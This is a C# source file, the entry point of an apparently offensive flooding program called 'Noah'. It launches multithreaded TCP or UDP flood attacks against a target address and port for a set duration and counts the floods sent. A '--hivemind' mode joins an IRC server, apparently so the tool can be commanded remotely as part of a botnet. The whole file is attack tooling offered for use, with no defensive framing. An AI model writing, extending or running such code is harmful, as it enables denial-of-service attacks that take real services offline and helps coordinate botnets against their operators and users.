using System;
using System.Threading;

using JRCLib;
using Noah.Attacks;

namespace Noah
{
    class MainClass
    {
        private static ApplicationState state;
        public static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                if (args[0] == "--hivemind")
                    enterHivemind(args);
                else
                    enterCli(args);
            }
            else
                enterCli(args);

            
        }

        private static void enterCli(string[] args)
        {
            state = new ArgumentParser(args).Parse();
            state.AttackCompleted += state_OnAttackCompleted;
            IAttack attack = null;

            switch (args[0].ToLower())
            {
                case "tcp":
                    attack = new HTTPAttack(state, args[1], state.Port);
                    break;
                case "udp":
                    attack = new UDPAttack(state, args[1], state.Port);
                    break;
                default:
                    Console.WriteLine("Unknown protocol: " + args[0]);
                    Environment.Exit(0);
                    break;
            }

            for (int i = 0; i < state.Threads; i++)
                attack.BeginAttack();
            Thread.Sleep(state.TimeAllocated);
            state.State = States.Done;
        }

        private static void state_OnAttackCompleted(object sender, AttackCompletedEventArgs e)
        {
            if (state.ShowTime)
                Console.WriteLine("Total elapsed time: " + state.StopWatch.Elapsed.Seconds);
            if (state.ShowFlood)
                Console.WriteLine("Total flood count: " + state.FloodCount.ToString());
            Environment.Exit(0);
        }

        private static void enterHivemind(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Missing ip and port");
                Environment.Exit(0);
            }
            IRCClient client = new IRCClient(args[1], Convert.ToInt32(args[2]), Environment.UserName + new Random().Next(0, 10), args[3], true);
            client.Connect();
        }
    }
}